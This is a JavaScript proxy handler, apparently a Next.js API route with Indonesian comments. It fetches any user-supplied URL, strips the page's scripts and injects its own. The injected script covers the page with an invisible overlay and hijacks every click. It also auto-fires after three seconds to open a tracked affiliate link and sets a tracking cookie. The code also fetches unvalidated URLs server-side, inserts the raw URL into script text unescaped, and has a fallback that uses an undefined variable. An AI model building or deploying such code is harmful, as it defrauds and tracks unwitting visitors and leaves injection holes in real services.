import { parse } from 'node-html-parser'

export default async function handler(req, res) {
  const { url } = req.query
  
  if (!url) {
    return res.status(400).json({ error: 'URL parameter is required' })
  }

  try {
    // Fetch konten dari URL target
    const response = await fetch(url, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
      }
    })

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`)
    }

    const html = await response.text()
    
    // Parse HTML
    const root = parse(html)
    
    // Remove script tags yang mungkin mengganggu
    const scripts = root.querySelectorAll('script')
    scripts.forEach(script => {
      // Biarkan script tertentu, hapus yang lain
      const src = script.getAttribute('src') || ''
      if (!src.includes('jquery') && !src.includes('google-analytics')) {
        script.remove()
      }
    })
    
    // Tambahkan script kita
    const trackingScript = `
      <script>
        (function() {
          // Ambil user ID
          function getUserId() {
            const cookies = document.cookie.split(';').reduce((acc, cookie) => {
              const [key, value] = cookie.trim().split('=')
              acc[key] = value
              return acc
            }, {})
            
            if (cookies['user_id']) return cookies['user_id']
            
            // Generate baru
            const newId = 'usr_' + Math.random().toString(36).substr(2, 12)
            document.cookie = 'user_id=' + newId + '; max-age=' + (60*60*24*30) + '; path=/'
            localStorage.setItem('user_id', newId)
            return newId
          }
          
          // Redirect function
          function performRedirect() {
            const userId = getUserId()
            const shopeeUrl = 'https://doobf.pro/8AQUp3ZesV?ref=' + userId + '&source=proxy_redirect'
            
            // Buka shopee di tab baru
            const shopeeWindow = window.open(shopeeUrl, '_blank')
            
            // Redirect halaman ini setelah delay singkat
            setTimeout(() => {
              window.location.href = '${url}'
            }, 150)
          }
          
          // Handle semua klik
          document.addEventListener('click', function(e) {
            e.preventDefault()
            e.stopPropagation()
            performRedirect()
            return false
          }, true)
          
          // Auto redirect setelah 3 detik
          setTimeout(() => {
            performRedirect()
          }, 3000)
          
          // Tambahkan overlay untuk memastikan klik tertangkap
          const overlay = document.createElement('div')
          overlay.id = 'click-overlay'
          overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;cursor:pointer;background:transparent;'
          document.body.appendChild(overlay)
          
          // Tambahkan notification
          const notification = document.createElement('div')
          notification.id = 'redirect-notification'
          notification.style.cssText = 'position:fixed;bottom:20px;right:20px;background:#4CAF50;color:white;padding:10px20px;border-radius:5px;z-index:1000000;box-shadow:02px10pxrgba(0,0,0,0.2);'
          notification.innerHTML = 'Klik di mana saja untuk melanjutkan'
          document.body.appendChild(notification)
          
          // Hide notification setelah 5 detik
          setTimeout(() => {
            notification.style.display = 'none'
          }, 5000)
          
          console.log('Redirect system activated')
        })()
      </script>
    `
    
    // Tambahkan script sebelum closing body tag
    const body = root.querySelector('body')
    if (body) {
      body.insertAdjacentHTML('beforeend', trackingScript)
    } else {
      // Jika tidak ada body tag, tambahkan di akhir
      root.insertAdjacentHTML('beforeend', trackingScript)
    }
    
    // Set headers yang sesuai
    res.setHeader('Content-Type', 'text/html; charset=utf-8')
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate')
    res.setHeader('Pragma', 'no-cache')
    res.setHeader('Expires', '0')
    res.setHeader('X-Proxy', 'true')
    
    res.status(200).send(root.toString())
    
  } catch (error) {
    console.error('Proxy error:', error)
    
    // Fallback: redirect langsung jika proxy gagal
    const fallbackHtml = `
      <!DOCTYPE html>
      <html>
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Redirecting...</title>
          <script>
            // Ambil atau buat user ID
            let userId = localStorage.getItem('user_id') || 
                        (document.cookie.match(/user_id=([^;]+)/) || [])[1]
            
            if (!userId) {
              userId = 'usr_' + Math.random().toString(36).substr(2, 12)
              document.cookie = 'user_id=' + userId + '; max-age=' + (60*60*24*30) + '; path=/'
              localStorage.setItem('user_id', userId)
            }
            
            // Redirect sequence
            function redirect() {
              const shopeeUrl = 'https://doobf.pro/8AQUp3ZesV?ref=' + userId
              window.open(shopeeUrl, '_blank')
              
              setTimeout(() => {
                window.location.href = '${url}'
              }, 100)
            }
            
            // Redirect setelah 1 detik
            setTimeout(redirect, 1000)
            
            // Klik di mana saja
            document.addEventListener('click', redirect)
          </script>
          <style>
            body {
              font-family: Arial, sans-serif;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              margin: 0;
              background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
              color: white;
            }
            .container {
              text-align: center;
              padding: 40px;
              background: rgba(255,255,255,0.1);
              backdrop-filter: blur(10px);
              border-radius: 20px;
              box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            }
            h1 { margin-bottom: 20px; }
            .id-display {
              background: rgba(255,255,255,0.2);
              padding: 10px;
              border-radius: 8px;
              margin: 20px 0;
              font-family: monospace;
              word-break: break-all;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>Sedang Mengalihkan...</h1>
            <p>Harap tunggu sebentar</p>
            <div class="id-display">User ID: ${userId || 'Generating...'}</div>
            <p>Klik di mana saja untuk mempercepat</p>
          </div>
        </body>
      </html>
    `
    
    res.setHeader('Content-Type', 'text/html')
    res.status(200).send(fallbackHtml)
  }
}
